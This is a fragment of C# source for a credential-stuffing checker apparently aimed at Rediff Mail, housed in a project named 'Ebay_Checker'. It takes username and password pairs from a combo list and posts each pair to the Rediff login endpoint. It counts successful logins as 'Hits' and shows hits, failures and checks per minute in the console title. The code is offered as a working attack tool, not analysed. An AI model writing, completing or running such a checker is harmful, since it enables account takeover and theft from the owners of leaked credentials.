...
namespace Ebay_Checker
{
    ...
    {
        [STAThread]
        public static void reddifstart()
        {
            Prsc.gmxapi();
            Export.Initialize();
            ...
            try
            {
                ...
                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        ...
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - Reddif Mail] | Hits: " + Variables.hit + " | Bads: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });
                    ...
                    try
                    {
                        ...
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            ...
                            try
                            {
                                ...
                                var res0 = httpRequest.Post("https://mail.rediff.com/cgi-bin/login.cgi", "FormName=existing&seclogin=on&login=" + s[0] + "&passwd=" + s[1] + "&proceed=Sign+in&remember=1", "application/x-www-form-urlencoded");
                                string text0 = res0.ToString();

                                if (text0.Contains("If you are seeing this page, your browser settings prevent you from automatically redirecting to a new URL"))
                                {
                                    Variables.hit++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                ...
                                else if (text0.Contains("Wrong username and password combination."))
                                {
                                    Variables.bad++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
